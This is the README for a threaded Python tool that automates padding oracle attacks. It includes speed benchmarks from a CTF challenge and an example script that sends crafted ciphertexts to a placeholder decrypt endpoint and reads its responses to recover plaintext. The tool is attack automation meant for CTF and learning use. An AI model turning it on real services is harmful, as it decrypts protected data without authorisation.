# padding_oracle.py

Extremely fast threaded [padding oracle](http://server.maojui.me/Crypto/Padding_oracle_attack/) automation script for Python >= 3.7.

## Performance

Tested on [0x09] Cathub Party from EDU-CTF:

| Request Threads | Execution Time |
|-----------------|----------------|
| 1               | 17m 43s        |
| 4               | 5m 23s         |
| 16              | 1m 20s         |
| 64              | 56s            |

## Example

All you need is defining the **oracle function** to check whether the given cipher is correctly decrypted.

```python
#!/usr/bin/env python3

import requests, logging
from padding_oracle import *

url = 'http://some-website.com/decrypt'
sess = requests.Session()

def oracle(cipher):
    r = sess.post(url, data={'cipher': base64_encode(cipher)})
    assert 'SUCCESS' in r.text or 'FAILED' in r.text
    return 'SUCCESS' in r.text

cipher = b'[______IV______][___Block_1____][___Block_2____]'
block_size = 16
num_threads = 64

plaintext = padding_oracle(cipher, block_size, oracle, num_threads, log_level=logging.DEBUG)

print(remove_padding(plaintext).decode())
```
